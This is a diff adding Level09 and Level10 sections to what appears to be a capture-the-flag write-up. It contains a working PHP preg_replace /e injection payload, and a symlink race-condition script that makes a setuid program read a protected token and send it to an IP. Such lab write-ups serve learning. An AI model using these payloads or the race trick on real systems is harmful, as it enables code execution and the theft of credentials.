@@ -69,3 +69,42 @@ is backd00Rmate. I used it for flag08 and was logged in successfully. I ran
 getflag and moved on.
 
 # Level09
+This program is a wrapper of a PHP code snippet. This snippet takes a path to a file,
+reads its content and looks for the following regex pattern:
+	/(\[email (.*)\])/
+which is the word "email" in square brackets with a space after it and optionally everything after the space.
+When it sees this pattern it replaces the email and brackets part of the string with whatever came after the space and calls a function on it. F.E:
+	"[email abcd]" -> "spam('abcd')"
+The spam() function replaces the "@" sign with the word AT and . with the word "dot".
+The vulnerability in the code is that the first regex (the [email ] one) is done with preg_replace with the "e" flag after the expression. It looks like this:
+	/(\[email (.*)\])/e
+Which means that whatever comes after the replacement will be evaluated. My goal was to make the result include my own code.
+At first I wanted to inject code by closing the spam() function and adding a system() call but every quote (double or single) are escaped so that wasn't possible.
+My solution was formatting a string with curly brackets and adding `` around my desired code.
+The file I used looked like this:
+	[email ${`getflag`}]
+Which resulted in the execution of getflag.
+
+# Level10
+This level contains a program that takes an IP and a file. It checks if the user can open the file and if he can, it sends its contents over a 
+socket to the given IP to port 18211. The vulnerability is in the use of the access() system call. The problem is that the program checks if the user can open the file and only later tries to open the file. This could be
+exploited by a race condition where access() is called on a file that I have permissions to and then I immediately swap the file with a symlink to the token.
+This causes the program to check the permissions to one file and read another.
+I wrote a shell script with the following lines:
+	
+	#!/bin/sh
+	n=1
+	while [ $n -le 10000 ]
+	do
+		echo "abc" > /tmp/link
+		ln /home/flag10/token /tmp/link -sf
+		n=$(( n+1 ))
+		rm /tmp/link
+	done
+
+and I ran the program with the following command:
+	/home/flag10/flag10 /tmp/link 192.168.80.1
+After a few tries I received the following token:
+	615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+
+# Level11
